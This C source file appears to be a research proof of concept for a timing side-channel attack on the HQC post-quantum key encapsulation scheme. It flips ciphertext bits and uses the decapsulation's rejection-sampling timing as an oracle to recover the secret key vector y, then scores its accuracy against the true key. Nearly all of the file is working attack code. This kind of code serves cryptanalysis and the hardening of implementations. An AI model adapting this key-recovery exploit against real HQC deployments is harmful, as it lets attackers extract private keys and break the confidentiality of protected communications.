#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <assert.h>
#include <x86intrin.h>

#include <sys/random.h>
#include <unistd.h>
#include <getopt.h>

#include "parameters.h"
#include "api.h"
#include "parsing.h"
#include "hqc.h"
#include "gf2x.h"
#include "code.h"
#include "vector.h"
#include "../lib/fips202/fips202.h"
#include "shake_prng.h"
#include "shake_ds.h"

#define MAX_E 2
#define H 1

#include "exploit_util/util.c"
#include "exploit_util/vec.c"
#include "exploit_util/isa.c"
#include "exploit_util_local/crypto_util.c"

#include <openssl/rsa.h>
#include <openssl/engine.h>
#include <openssl/bn.h>


#define N 1
#define ITERS 1
#define BITS_TO_FLIP (PARAM_N1N2)
#define MAJORITY_OF 5
#define MAJORITY_MIN ((MAJORITY_OF / 2) + 1)


int main(void) {
  unsigned char pk[PUBLIC_KEY_BYTES];
  unsigned char sk[SECRET_KEY_BYTES];
  unsigned char ct[N][CIPHERTEXT_BYTES];
  unsigned char key1[N][SHARED_SECRET_BYTES];
  unsigned char key2[SHARED_SECRET_BYTES];

  crypto_kem_keypair(pk, sk);

  for (int i = 0; i < N; ++i) {
    bzero(key2, SHARED_SECRET_BYTES);

    crypto_kem_enc(ct[i], key1[i], pk);
    crypto_kem_dec(key2, ct[i], sk);
    check_key(key1[i], key2, SHARED_SECRET_BYTES);
  }

  size_t bit_order[BITS_TO_FLIP];
  size_t bit_order2[BITS_TO_FLIP];
  for (size_t j = 0; j < BITS_TO_FLIP; ++j) {
    bit_order[j] = j;
    bit_order2[j] = j;
  }

  // we aim to recover y
  __m256i y_orig[VEC_N_256_SIZE_64 >> 2] = {0};
  __m256i x_orig[VEC_N_256_SIZE_64 >> 2] = {0};
  uint8_t *y_orig_bytes = (uint8_t*)y_orig;
  // uint8_t *x_resized_bytes = (uint8_t*)x_orig;
  {
    uint8_t pk[PUBLIC_KEY_BYTES] = {0};
    // Retrieve x, y, pk from secret key
    hqc_secret_key_from_string(x_orig, y_orig, pk, sk);
  }

  // puts("Finding message:");
  uint64_t m[VEC_K_SIZE_64] = {0};
  // Find a message for which rejection sampling takes exceptionally long
  find_message(m, 3, 10000000);
  puts("Found message:");
  print_hex((unsigned char*) m, VEC_K_SIZE_64 * sizeof *m);
  
  struct timing_info tix = message_timing(m);
  printf("Timing: %lu (should be 3)\n", tix.seed_expander_iters);

  puts("Encrypting message");
  // m*G should decrypt
  // find_message(m, 3, 10000000);
  crypto_kem_enc_m(0, m, ct[0], key1[0], pk);

  unsigned char ct_backup[CIPHERTEXT_BYTES];
  memcpy(ct_backup, ct[0], CIPHERTEXT_BYTES);

  struct timing_info ti = message_timing(m);
  printf("Timing: %lu\n", ti.seed_expander_iters);
  uint64_t ma[VEC_K_SIZE_64] = {0};
  {
    unsigned char ss[SHARED_SECRET_BYTES];
    puts("Decrypting");
    crypto_kem_dec(ss, ct[0], sk);
  }
  puts("Decrypting message");
  crypto_kem_dec_m(ma, ct[0], sk);
  if (memcmp(ma, m, VEC_K_SIZE_BYTES) != 0) {
    puts("This should decrypt");
    return 1;
  }

  int results[BITS_TO_FLIP] = {0};
  int counters[BITS_TO_FLIP] = {0};

  size_t decryption_oracle_calls = 0;
  size_t tp = 0, fp = 0, tn = 0, fn = 0;
  size_t tp_ti = 0, fp_ti = 0, tn_ti = 0, fn_ti = 0;
  for (size_t o = 0; 1;) {
    find_message(m, 3, 10000000);
    crypto_kem_enc_m(0, m, ct[0], key1[0], pk);
    memcpy(ct_backup, ct[0], CIPHERTEXT_BYTES);
    shuffle(bit_order, BITS_TO_FLIP);
    size_t l = 0;
    for (; l < BITS_TO_FLIP; ++l) {
      size_t bit_flip_pos = bit_order[l] + VEC_N_SIZE_BYTES * 8; // flip bits in v

      size_t byte_to_flip = bit_flip_pos / 8;
      size_t bit_to_flip = bit_flip_pos % 8;
      ct[0][byte_to_flip] ^= 1<<bit_to_flip;

      if (l < 7000) {
        continue;
      }

      uint64_t m2[VEC_K_SIZE_64] = {0};
      crypto_kem_dec_m(m2, ct[0], sk);
      ++decryption_oracle_calls;
      struct timing_info ti2 = message_timing(m2);
      // printf("%05zu Recovered key: ", l);
      // print_hex((uint8_t*)m2, VEC_K_SIZE_BYTES);
      if (memcmp(m2, m, VEC_K_SIZE_BYTES) == 0) {
        int expect = ti.seed_expander_iters == ti2.seed_expander_iters;
        if (!expect) {
          printf("Timing %lu === %lu ? %s\n", ti.seed_expander_iters, ti2.seed_expander_iters, expect ? "yes" : "NO!!!");
          puts("THIS SHOULD NEVER HAPPEN");
          exit(1);
        }
      } else {
        int expect = ti.seed_expander_iters != ti2.seed_expander_iters;
        if (!expect) {
          printf("Timing %lu =/= %lu ? %s\n", ti.seed_expander_iters, ti2.seed_expander_iters, expect ? "yes" : "NO!!!");
          puts("Failed to detect message changing");
          // exit(1);
        }
      }
      
      if (ti.seed_expander_iters != ti2.seed_expander_iters) {
        printf("Took %zu bit flips to get here", l);
        fflush(stdout);

        size_t new_fp = 0;
        // Now flip every bit to see if it is part of the error
        int local_results[BITS_TO_FLIP] = {0};
        int local_counters[BITS_TO_FLIP] = {0};
        size_t positive_samples = 0; // if more than 50% of samples come back positive, ignore this sample
        size_t samples = 0;
        shuffle(bit_order2, BITS_TO_FLIP);
        for (size_t b = 0; b < BITS_TO_FLIP; ++b) {
          size_t q = bit_order2[b];
          if (results[q] >= MAJORITY_MIN || counters[q] - results[q] >= MAJORITY_MIN) {
            continue;
          }
          size_t bit_flip_pos = q + VEC_N_SIZE_BYTES * 8; // flip bits in v
          size_t byte_to_flip = bit_flip_pos / 8;
          size_t bit_to_flip = bit_flip_pos % 8;
          ct[0][byte_to_flip] ^= 1<<bit_to_flip;

          uint64_t m3[VEC_K_SIZE_64] = {0};
          crypto_kem_dec_m(m3, ct[0], sk);
          ++decryption_oracle_calls;
          struct timing_info ti3 = message_timing(m3);
          // printf("%05zu Recovered key: ", l);
          // print_hex((uint8_t*)m2, VEC_K_SIZE_BYTES);

          int expect_error_ti = ti3.seed_expander_iters == ti.seed_expander_iters;

          int our_error = 0;
          for (size_t w = 0; w <= l; ++w) {
            if (bit_order[w] == q) {
              // puts("FOUND");
              our_error = 1;
              break;
            }
          }

          {
            // For debugging only
            // if the modified ciphertext decrypts back to the original message
            // after flipping a bit back
            // then that bit is an error in the modified ciphertext
            int expect_error = memcmp(m3, m, VEC_K_SIZE_BYTES) == 0;
            int set_in_y = (y_orig_bytes[q / 8] >> (q % 8)) & 1;
            // assert(set_in_y == 0);
            int should_be_error = our_error ^ set_in_y;

            // printf("                                                      %d %d\n", our_error, set_in_y);
            if (expect_error && !should_be_error) {
              // printf("False positive: %05zu is NOT an error, but was detected as such\n", q);
              ++fp;
              // exit(1);
            } else if (!expect_error && should_be_error) {
              // printf("False negative: %05zu is an error, but was NOT detected as such\n", q);
              ++fn;
              // exit(1);
            } else {
              // printf("Successfully identified true ");
              if (expect_error && should_be_error) {
                // printf("positive");
                ++tp;
              } else if (!expect_error && !should_be_error) {
                // printf("negative");
                ++tn;
              } else {
                puts("WHAT 62883 ?!?!");
                exit(1);
              }
              // printf(" bit %05zu\n", q);
            }

            if (expect_error_ti && !should_be_error) {
              // printf("TI False positive: %05zu is NOT an error, but was detected as such\n", q);
              ++new_fp;
              ++fp_ti;
              // exit(1);
            } else if (!expect_error_ti && should_be_error) {
              // printf("False negative: %05zu is an error, but was NOT detected as such\n", q);
              ++fn_ti;
              // exit(1);
            } else {
              // printf("Successfully identified bit %05zu\n", q);
              if (expect_error_ti && should_be_error) {
                ++tp_ti;
              } else if (!expect_error_ti && !should_be_error) {
                ++tn_ti;
              } else {
                puts("WHAT 81827 ?!?!");
                exit(1);
              }
            }
          }

          if (expect_error_ti) {
            // the bit we flipped is an error in the modified ciphertext!
            // If we flipped the bit, then it is not an error in the original message
            // is_error (in the original ciphertext) = expect_error_ti XOR our_error = !our_error (since expect_error_ti is 1)
            int is_error = !our_error;
            local_results[q] += is_error;
            local_counters[q] += 1;
            ++positive_samples;
          }
          ++samples;

          ct[0][byte_to_flip] ^= 1<<bit_to_flip;
        }

        printf("\n\033[2J\n");

        double positivity = (double)positive_samples/samples;
        printf("Positivity: %lf%%\n", positivity * 100);
        for (size_t b = 0; b < BITS_TO_FLIP; ++b) {
          counters[b] += local_counters[b];
          results[b] += local_results[b];
        }

        puts("Totals (best obtainable version of the truth):");
        printf("True positive:  %zu\n", tp);
        printf("False negative: %zu\n", fn);
        printf("True negative:  %zu\n", tn);
        printf("False positive: %zu\n", fp);
        printf("Sensitivity %lf%% Specificity %lf%% PPV: %lf%% NPV: %lf%%\n", (double)tp/(tp+fn)*100, (double)tn/(tn + fp)*100, (double)tp/(tp + fp)*100, (double)tn/(tn+fn)*100);
        puts("");

        puts("Totals (using timing information):");
        printf("True positive:  %zu\n", tp_ti);
        printf("False negative: %zu\n", fn_ti);
        printf("True negative:  %zu\n", tn_ti);
        printf("False positive: %zu\n", fp_ti);
        printf("Sensitivity %lf%% Specificity %lf%% PPV: %lf%% NPV: %lf%%\n", (double)tp_ti/(tp_ti+fn_ti)*100, (double)tn_ti/(tn_ti + fp_ti)*100, (double)tp_ti/(tp_ti + fp_ti)*100, (double)tn_ti/(tn_ti+fn_ti)*100);
        puts("");
        printf("New false positives: %zu\n", new_fp);
        ++l; // so we can reliably flip all bits back (even if the loop terminated because of the loop condition)
        break;
      }
    }
    // Flip all bits back to obtain the original ciphertext
    for (size_t y = 0; y < l; ++y) {
      size_t bit_flip_pos = bit_order[y] + VEC_N_SIZE_BYTES * 8; // flip bits in v
      size_t byte_to_flip = bit_flip_pos / 8;
      size_t bit_to_flip = bit_flip_pos % 8;
      ct[0][byte_to_flip] ^= 1<<bit_to_flip;
    }
    if (memcmp(ct_backup, ct[0], CIPHERTEXT_BYTES) != 0) {
      puts("ERROR: Failed to restore the original ciphertext, something is wrong!");
      exit(1);
    }
    size_t has_results = 0;
    size_t has_prediction = 0;
    size_t sufficient_results = 0;
    size_t classified_wrong = 0;
    size_t final_classified_wrong = 0;
    size_t need_extended_samples = 0;
    for (size_t b = 0; b < BITS_TO_FLIP; ++b) {
      size_t byte_to_flip = b / 8;
      size_t bit_to_flip = b % 8;
      int set_in_y = (y_orig_bytes[byte_to_flip] >> bit_to_flip) & 1;

      int sufficient = (results[b] >= MAJORITY_MIN) || (counters[b] - results[b] >= MAJORITY_MIN);
      need_extended_samples += counters[b] != 0 && (results[b] != 0 && results[b] != counters[b]);
      if (counters[b] - results[b] != results[b]) { // if there is a majority we can make a prediction
        int prediction = counters[b] - results[b] < results[b]; // this is negated because we obtain -y
        int wrong = prediction != set_in_y;
        has_prediction += 1;
        classified_wrong += wrong;
        final_classified_wrong += wrong && sufficient;
      }
      sufficient_results += sufficient;
      has_results += counters[b] != 0;
    }
    ++o;

    printf("Iteration %zu\n", o);
    printf("Decryption oracle calls: %lu\n", decryption_oracle_calls);
    printf("Results for %lu of %d bits (%lf%%)\n", has_results, (BITS_TO_FLIP), (double)has_results/BITS_TO_FLIP*100);
    printf("Sufficient results for %lu of %lu bits (%lf%%)\n", sufficient_results, has_results, (double)sufficient_results/has_results*100);
    printf("%lu of %lu bits (%lf%%) need extended samples\n", need_extended_samples, has_results, (double)need_extended_samples/has_results*100);
    printf("Classification: %lu bits wrong (%lf%%)\n", classified_wrong, (double)classified_wrong/has_prediction*100);
    printf("Final classification: %lu bits wrong\n", final_classified_wrong);
    if (sufficient_results == BITS_TO_FLIP) {
      puts("Done. Have a decision for every bit.");
      break;
    }
  }
  __m256i recovered_y[VEC_N_256_SIZE_64 >> 2] = {0};
  uint8_t *recovered_y_bytes = (uint8_t*)recovered_y;

  {
    puts("Recovering remaining bits");
    unsigned char ct[CIPHERTEXT_BYTES];
    unsigned char ss[SHARED_SECRET_BYTES];
    unsigned char ss2[SHARED_SECRET_BYTES];
    crypto_kem_enc(ct, ss, pk);

    Vecs vs = generate_inside_patterns();
    int found = 0;
    for (size_t i = 0; i < vs.len && !found; ++i) {
      Vec pattern = vs.v[i];

      for (size_t j = 0; j < pattern.len; ++j) {
        flip_bit(recovered_y_bytes, PARAM_N1N2 + pattern.v[j]);
      }

      // Check if key is usable
      // pk should be the same
      crypto_kem_dec_sk(ss2, ct, pk, recovered_y);
      if (memcmp(ss, ss2, sizeof ss) == 0) {
        puts("");
        puts("Inside error pattern:");
        vec_print(pattern);
        found = 1;
        break;
      }

      if (memcmp(recovered_y_bytes, y_orig_bytes, VEC_N_SIZE_BYTES) == 0) {
        puts("Should have exited the loop!");
        exit(1);
      }

      for (size_t j = 0; j < pattern.len; ++j) {
        flip_bit(recovered_y_bytes, PARAM_N1N2 + pattern.v[j]);
      }
    }
    if (!found) {
      puts("None of the inside error patterns match!");
    }
    vecs_free(&vs);
  }

  for (size_t b = 0; b < BITS_TO_FLIP; ++b) {
    int prediction = results[b] >= MAJORITY_MIN; // this is negated because we obtain -y, but apparently not?!?!
    size_t byte_to_flip = b / 8;
    size_t bit_to_flip = b % 8;
    int actual = (y_orig_bytes[byte_to_flip] >> bit_to_flip) & 1;
    printf("pred=%d is=%d same=%d results=%d counters=%d percent=%lf%%\n", prediction, actual, prediction == actual, results[b], counters[b], (double)results[b]/counters[b]*100);
    if (prediction) {
      recovered_y_bytes[byte_to_flip] ^= 1<<bit_to_flip;
    }
  }

  puts("Recovered:");
  print_hex0(recovered_y_bytes, VEC_N1N2_SIZE_BYTES);
  puts("");
  puts("");
  puts("Original:");
  print_hex0((uint8_t*)y_orig, VEC_N1N2_SIZE_BYTES);
  printf("Success? %d\n", (memcmp(y_orig, recovered_y_bytes, VEC_N_SIZE_BYTES) == 0));
}
